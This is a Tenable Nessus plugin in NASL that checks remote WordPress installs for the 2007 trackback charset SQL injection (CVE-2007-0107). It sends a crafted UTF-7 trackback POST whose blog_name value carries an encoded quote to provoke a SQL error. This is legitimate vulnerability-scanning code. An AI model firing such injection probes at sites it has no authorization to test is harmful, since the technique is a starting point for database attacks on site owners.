#
# (C) Tenable Network Security
#


include("compat.inc");

if (description)
{
  script_id(24011);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2007-0107");
  script_bugtraq_id(21896, 21907);
  script_xref(name:"OSVDB", value:"31579");

  script_name(english:"WordPress Trackback Charset Decoding SQL Injection");
  script_summary(english:"Checks for SQL injection in WordPress");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to SQL
injection attacks." );
 script_set_attribute(attribute:"description", value:
"The version of WordPress on the remote host supports trackbacks in
alternate character sets and decodes them after escaping SQL
parameters.  By specifying an alternate character set and encoding
input with that character set while submitting a trackback, an
unauthenticated remote attacker can bypass the application's parameter
sanitation code and manipulate database queries. 

Note that exploitation of this issue is only possible when PHP's
mbstring extension is installed, which is apparently the case with the
remote host." );
 script_set_attribute(attribute:"see_also", value:"http://www.hardened-php.net/advisory_022007.141.html" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/fulldisclosure/2007-01/0125.html" );
 script_set_attribute(attribute:"see_also", value:"http://wordpress.org/development/2007/01/wordpress-206/" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to WordPress version 2.0.6 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/wordpress"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # First we need a post id.
  res = http_get_cache(item:string(dir, "/index.php"), port:port);
  if (res == NULL) exit(0);

  pat = string(dir, '/([^" #]+)#(comments|respond)"');
  pid = NULL;
  matches = egrep(pattern:pat, string:res);
  if (matches)
  {
    foreach match (split(matches))
    {
      match = chomp(match);
      value = eregmatch(pattern:pat, string:match);
      if (!isnull(value))
      {
        pid = value[1];
        break;
      }
    }
  }

  # If we have one...
  if (pid)
  {
    # Make sure the affected script and posting id exist.
    #
    # nb: the format of the trackback URL depends on whether or not
    #     pretty permalinks are in use.
    if ("?p=" >< pid) url = string(dir, "/wp-trackback.php", pid);
    else
    {
      if (pid !~ "/$") pid = pid + '/';
      url = string(dir, "/", pid, "trackback/");
    }

    req = http_get(item:url, port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
    if (res == NULL) exit(0);

    # If they do...
    if ("X-Pingback: " >< res)
    {
      # Try to exploit the flaw to generate a SQL error.
      postdata = string(
        "charset=UTF-7&",
        "title=None&",
        "url=None&",
        "excerpt=None&",
        "blog_name=", SCRIPT_NAME, "%2BACc-,"
      );
      req = string(
        "POST ", url, " HTTP/1.1\r\n",
        "Host: ", get_host_name(), "\r\n",
        "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
        "Content-Type: application/x-www-form-urlencoded\r\n",
        "Content-Length: ", strlen(postdata), "\r\n",
        "\r\n",
        postdata
      );
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      if (res == NULL) exit(0);

      # There's a problem if we see an error.
      if (
        "error in your SQL syntax" &&
        string("AND ( comment_author = '", SCRIPT_NAME, "',") >< res
      )
      {
        security_warning(port);
	set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
        exit(0);
      }
    }
  }
}
